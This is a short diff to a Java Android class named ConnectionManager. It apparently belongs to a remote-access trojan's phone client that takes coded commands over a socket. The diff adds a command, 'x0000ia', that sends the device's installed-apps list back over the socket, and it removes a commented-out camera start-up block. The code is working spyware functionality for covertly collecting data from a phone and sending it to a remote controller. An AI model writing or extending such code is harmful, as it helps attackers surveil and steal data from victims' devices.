@@ -112,7 +112,10 @@ public class ConnectionManager {
                                 Log.e("case 0in", "case");
                                 x0000in();
                                 break;
-
+                            case "x0000ia":
+                                Log.e("case 0ia", "case");
+                                x0000ia();
+                                break;
 
                         }
 
@@ -141,12 +144,6 @@ public class ConnectionManager {
         } else {
             new CameraManager(context).startUp(req);
         }
-        /*else if (req == 1){
-            new CameraManager(context).startUp(1);
-        }
-        else if (req == 0){
-            new CameraManager(context).startUp(0);
-        }*/
 
     }
 
@@ -356,6 +353,10 @@ public class ConnectionManager {
             e.printStackTrace();
         }
 
+    }
+
+    public static void x0000ia(){
+        ioSocket.emit("x0000ia", AppsManager.getAppsInfo());
     }
 
 
